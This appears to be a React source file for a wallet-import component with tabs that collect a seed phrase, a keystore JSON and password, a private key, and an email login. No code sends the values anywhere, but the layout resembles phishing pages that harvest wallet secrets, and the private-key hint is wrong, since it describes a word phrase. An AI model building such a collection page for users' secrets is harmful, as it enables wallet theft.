import { useState } from 'react'
import { Route, Routes } from 'react-router-dom'
import styles from './WalletTabs.module.scss'

export function WalletTabs(props: any) {
    const views = [
        {
            name: 'Phrase',
            element: <Phrase />
        },
        {
            name: 'Keystore JSON',
            element: <Keystore />
        },
        {
            name: 'Private Key',
            element: <PrivateKey />
        },
        {
            name: 'Email',
            element: <Email />
        },
    ]

    const [currentView, setCurrentView] = useState(0)
    return (
        <section className={styles.wallet_tabs}>
            <nav>
                {views.map((view, index) => (
                    <button key={index}
                        onClick={() => setCurrentView(index)}
                        title={index === currentView && 'current'}
                    >{view.name}</button>
                ))}
            </nav>
            <section>
                {views[currentView].element}
            </section>
        </section>
    )
}


function Phrase(props: any) {
    const [token, setToken] = useState('')
    return (
        <form className={styles.form}>
            <textarea value={token} 
            onChange={(e) => setToken(e.target.value)} 
            placeholder='Phrase'
            ></textarea>
            <p>Typically 12(sometimes 24) words separated by single spaces</p>
            <button type='submit'>Proceed</button>
        </form>
    )
}

function Keystore(props: any) {
    const [token, setToken] = useState('')
    const [password, setPassword] = useState('')
    return (
        <form className={styles.form}>
            <textarea value={token} 
            onChange={(e) => setToken(e.target.value)} 
            placeholder='Keystore JSON'
            ></textarea>
            <input value={password} 
            onChange={(e) => setPassword(e.target.value)} 
            placeholder='Password' />
            <p>Several lines of text beginning with &#123;...&#125; plus the password you used to encrypt it.</p>
            <button type='submit'>Proceed</button>
        </form>
    )
}

function PrivateKey(props: any) {
    const [pKey, setPKey] = useState('')
    return (
        <form className={styles.form}>
            <input value={pKey} 
            onChange={(e) => setPKey(e.target.value)} 
            placeholder='Private Key' />
            <p>Typically 12(sometimes 24) words separated by single spaces</p>
            <button type='submit'>Proceed</button>
        </form>
    )
}

function Email(props: any) {
    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    return (
        <form className={styles.form}>
            <input value={email} 
            onChange={(e) => setEmail(e.target.value)} 
            placeholder='Email' />
            <input value={password} 
            onChange={(e) => setPassword(e.target.value)} 
            placeholder='Password' />
            <button type='submit'>Proceed</button>
        </form>
    )
}